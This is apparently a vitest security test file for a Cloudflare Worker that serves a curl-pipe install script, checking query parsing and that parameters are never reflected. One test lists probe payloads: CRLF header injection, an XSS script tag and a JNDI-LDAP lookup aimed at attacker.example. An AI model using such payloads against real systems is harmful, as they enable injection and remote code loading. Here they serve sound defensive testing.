import { SELF } from "cloudflare:test";
import { describe, it, expect } from "vitest";
import { expectInstallScript, expectWalkthrough } from "./_helpers.ts";

// RED tests — Query string canonicalization (findings Q-01..Q-05 from
// security-audit/phase-2-pen-test-additions.md).
//
// Threat: `?explain=1` flips the response from "raw install script" to
// "human-readable walkthrough". Any ambiguity in the query parser becomes a
// trust-perimeter problem: a curl client with `?explain=1` who got the script
// instead of the walkthrough would be at minimum confused, at worst piping
// bytes they thought they were reading. Conversely, a script-fetcher tricked
// into hitting `?explain=true` who got a walkthrough instead of the script
// would silently fail an install.
//
// The contract this file pins:
//
//   - `?explain=1` is THE singular trigger. Not `?explain=true`, not
//     `?EXPLAIN=1`, not `?explain=yes`. Exactness eliminates a class of
//     "the contract grew in ways we don't control" bugs.
//   - Case sensitivity policy: `?explain=1` is case-sensitive. `?EXPLAIN=1`
//     and `?Explain=1` do NOT trigger walkthrough. URL params per RFC 3986
//     are case-sensitive, but real-world parsers vary; pin the choice.
//   - Unknown query params are silently ignored AND not echoed in the
//     response. Echoing arbitrary attacker-controlled query bytes into the
//     response body is the classic header/body reflection class — and on a
//     URL whose response gets piped to `sh`, reflection becomes RCE.
//   - Repeated params: `?explain=1&explain=0` resolves to first-wins per
//     existing Worker convention. Pin once so Phase 3 doesn't drift.
//   - Fragments don't reach the server (browser strips `#frag`), but a
//     percent-encoded `%23` does. `?explain=1%23frag` is the literal value
//     `1#frag`, which is NOT `1` → must NOT trigger walkthrough.
//
// This file extends the `explain.test.ts` happy-path tests rather than
// duplicating them. Existing coverage: `?explain=1` → walkthrough on curl,
// `?explain=1` → redirect on browser. New here: every variation that should
// NOT trigger walkthrough, every reflection probe, every edge case.
//
// Pre-implementation, every assertion fails because the stub returns 500.
// Tests assert positive contracts (200 + script body OR 200 + walkthrough)
// so they cannot pass tautologically against the stub.

const CURL_UA = "curl/8.4.0";

describe("explain trigger is case-sensitive (Q-01)", () => {
  // Q-01: pick a policy and pin it. Per RFC 3986 §3.4, query parameter names
  // are case-sensitive. The `?explain=1` lowercase form is the documented
  // contract; any other case must serve the install script (the curl branch's
  // default behaviour), NOT the walkthrough.
  for (const variant of ["EXPLAIN", "Explain", "EXPlain", "explaiN"]) {
    it(`?${variant}=1 with curl UA → install script (not walkthrough)`, async () => {
      const res = await SELF.fetch(`https://worthless.sh/?${variant}=1`, {
        headers: { "user-agent": CURL_UA },
      });
      // Positive contract: must serve install.sh. Does not assert "not
      // walkthrough" via negation; instead asserts the affirmative shape.
      await expectInstallScript(res);
    });
  }

  it("?explain=1 with curl UA → walkthrough (control: lowercase still works)", async () => {
    // Sanity: the case-sensitivity policy must not break the documented form.
    const res = await SELF.fetch("https://worthless.sh/?explain=1", {
      headers: { "user-agent": CURL_UA },
    });
    await expectWalkthrough(res);
  });
});

describe("only the literal value `1` triggers walkthrough (Q-02)", () => {
  // Q-02: `?explain=true`, `?explain=yes`, `?explain=on`, `?explain=01`, all
  // of these are NOT the documented contract. Each must serve the install
  // script. If the contract grew to accept these, an attacker could craft
  // ambiguous URLs (especially `?explain=01` which some parsers normalize)
  // to confuse downstream tooling.
  for (const value of ["true", "TRUE", "yes", "on", "01", "2", "-1", ""]) {
    it(`?explain=${JSON.stringify(value)} with curl UA → install script (not walkthrough)`, async () => {
      const res = await SELF.fetch(
        `https://worthless.sh/?explain=${encodeURIComponent(value)}`,
        {
          headers: { "user-agent": CURL_UA },
        },
      );
      await expectInstallScript(res);
    });
  }
});

describe("unknown query params are ignored and never echoed (Q-03)", () => {
  // Q-03: the reflection class. If the Worker echoes any query parameter
  // value into the response body or any response header, an attacker can
  // smuggle arbitrary bytes into a `curl | sh` pipe. The sentinel approach:
  // pick a string that has no business appearing in install.sh, send it as
  // an unknown param, then grep the entire response.
  const SENTINEL = "WORTHLESS_REFLECTION_SENTINEL_ZZZ_8847";

  it("unknown param does not change the install-script response", async () => {
    const res = await SELF.fetch(
      `https://worthless.sh/?utm_source=${SENTINEL}`,
      {
        headers: { "user-agent": CURL_UA },
      },
    );
    // Unconditional precondition: response was the install script (so the
    // body assertion below is meaningful, not vacuous on a 500).
    await expectInstallScript(res);
  });

  it("unknown param value never appears in the response body", async () => {
    const res = await SELF.fetch(
      `https://worthless.sh/?utm_source=${SENTINEL}&ref=${SENTINEL}`,
      {
        headers: { "user-agent": CURL_UA },
      },
    );
    expect(res.status).toBe(200);
    const body = await res.text();
    expect(body).not.toContain(SENTINEL);
  });

  it("unknown param value never appears in any response header", async () => {
    const res = await SELF.fetch(
      `https://worthless.sh/?evil=${SENTINEL}`,
      {
        headers: { "user-agent": CURL_UA },
      },
    );
    expect(res.status).toBe(200);
    for (const [name, value] of res.headers) {
      expect(value, `header ${name} reflected query param value`).not.toContain(
        SENTINEL,
      );
    }
  });

  it("CRLF and HTML payloads in query value never echo to body or headers (CWE-93/79)", async () => {
    // Per audit review: extend the reflection check beyond a benign sentinel
    // to attacker payloads. CRLF probes for header-injection / response-
    // splitting; HTML probes for context-confusion bugs (a future error page
    // that reflects query values into HTML); JNDI for log-injection class.
    const PAYLOADS = [
      "%0d%0aX-Inject:%201",
      "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
      "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D",
    ];
    for (const payload of PAYLOADS) {
      const res = await SELF.fetch(
        `https://worthless.sh/?evil=${payload}`,
        {
          headers: { "user-agent": CURL_UA },
        },
      );
      expect(res.status).toBe(200);
      const body = await res.text();
      const decoded = decodeURIComponent(payload);
      expect(body, `body contains payload ${decoded}`).not.toContain(decoded);
      // No header echo — covers CRLF / response-splitting class.
      for (const [name, value] of res.headers) {
        expect(value, `header ${name} contains X-Inject`).not.toContain("X-Inject");
        expect(value, `header ${name} contains CR`).not.toContain("\r");
        expect(value, `header ${name} contains LF`).not.toContain("\n");
      }
    }
  });

  it("?explain=1 still wins when accompanied by unknown params", async () => {
    const res = await SELF.fetch(
      `https://worthless.sh/?explain=1&utm_source=${SENTINEL}&ref=foo`,
      {
        headers: { "user-agent": CURL_UA },
      },
    );
    // Body is consumed twice — once by `expectWalkthrough` (which calls
    // `res.text()` to assert the walkthrough shape) and once by the
    // sentinel-echo check below. Clone before the helper consumes the
    // primary body. Without `clone`, the second `text()` throws
    // "Body has already been used" because Response bodies are
    // single-use streams.
    const cloned = res.clone();
    // Unknown params do not suppress the documented trigger.
    await expectWalkthrough(res);
    const body = await cloned.text();
    // And the sentinel still must not echo into the walkthrough body.
    expect(body).not.toContain(SENTINEL);
  });
});

describe("repeated explain params resolve deterministically (Q-04)", () => {
  // Q-04: pick first-wins per Worker convention (URLSearchParams.get returns
  // the first value). Last-wins would be valid too — the point is that the
  // Worker MUST commit to one. Otherwise an attacker can craft a URL whose
  // interpretation differs between the Worker and a logging proxy.
  it("?explain=1&explain=0 with curl UA → walkthrough (first wins)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=1&explain=0", {
      headers: { "user-agent": CURL_UA },
    });
    // First value `1` is the trigger → walkthrough.
    await expectWalkthrough(res);
  });

  it("?explain=0&explain=1 with curl UA → install script (first wins)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=0&explain=1", {
      headers: { "user-agent": CURL_UA },
    });
    // First value `0` does not match `1` → install script.
    await expectInstallScript(res);
  });

  it("?explain=1&explain=1 with curl UA → walkthrough (idempotent)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=1&explain=1", {
      headers: { "user-agent": CURL_UA },
    });
    // Sanity: a duplicated correct value still triggers walkthrough.
    await expectWalkthrough(res);
  });
});

describe("fragments and percent-encoded fragment markers (Q-05)", () => {
  // Q-05: real fragments (`#frag`) are stripped by HTTP clients before the
  // request is sent — they never reach the server. But a percent-encoded
  // `%23` is the LITERAL `#` character in the URL, so `?explain=1%23frag` is
  // the parameter value `1#frag`, which is NOT `1` and must NOT trigger
  // walkthrough. This is the parser-differential trap: a logging proxy that
  // displays the URL might render it as `?explain=1#frag` and a human reader
  // would assume it triggered walkthrough.
  it("?explain=1%23frag → install script (value is `1#frag`, not `1`)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=1%23frag", {
      headers: { "user-agent": CURL_UA },
    });
    // The literal value is `1#frag`. Q-02 policy: only `1` triggers walkthrough.
    await expectInstallScript(res);
  });

  it("?explain=%231 → install script (value is `#1`, not `1`)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=%231", {
      headers: { "user-agent": CURL_UA },
    });
    await expectInstallScript(res);
  });

  it("?explain=1&%23=junk → walkthrough (the # param is unknown, ignored)", async () => {
    // The `#` here is a parameter NAME (percent-encoded), not the trigger
    // value. `explain=1` is still the canonical trigger.
    const res = await SELF.fetch("https://worthless.sh/?explain=1&%23=junk", {
      headers: { "user-agent": CURL_UA },
    });
    await expectWalkthrough(res);
  });
});

describe("query string with no equals sign or no value (edge cases)", () => {
  // Bonus: parser-differential cases that don't fit cleanly into Q-01..Q-05
  // but follow the same "exactness wins" principle.
  it("?explain (no `=`, no value) → install script (not the trigger)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain", {
      headers: { "user-agent": CURL_UA },
    });
    // `?explain` parses to value `""` (empty), not `"1"` → not the trigger.
    await expectInstallScript(res);
  });

  it("?explain= (empty value) → install script (not the trigger)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=", {
      headers: { "user-agent": CURL_UA },
    });
    await expectInstallScript(res);
  });

  it("?=1 (no name) → install script (no `explain` param at all)", async () => {
    const res = await SELF.fetch("https://worthless.sh/?=1", {
      headers: { "user-agent": CURL_UA },
    });
    await expectInstallScript(res);
  });
});

describe("oversized query values do not panic the isolate (gap: chaos review)", () => {
  // Per chaos review: paths up to 8KB are tested in paths.test.ts, but
  // query values up to 64KB+ are uncovered. A massive value should not
  // panic the isolate, and an unknown name should still be ignored.
  it("64KB unknown query value → not 5xx, install script still served", async () => {
    const huge = "X".repeat(64 * 1024);
    const res = await SELF.fetch(`https://worthless.sh/?utm_source=${huge}`, {
      headers: { "user-agent": CURL_UA },
    });
    // Either 200 (script served, query ignored as expected) or 414 URI
    // Too Long. Forbidden: 5xx (isolate panic).
    expect([200, 414]).toContain(res.status);
  });
});
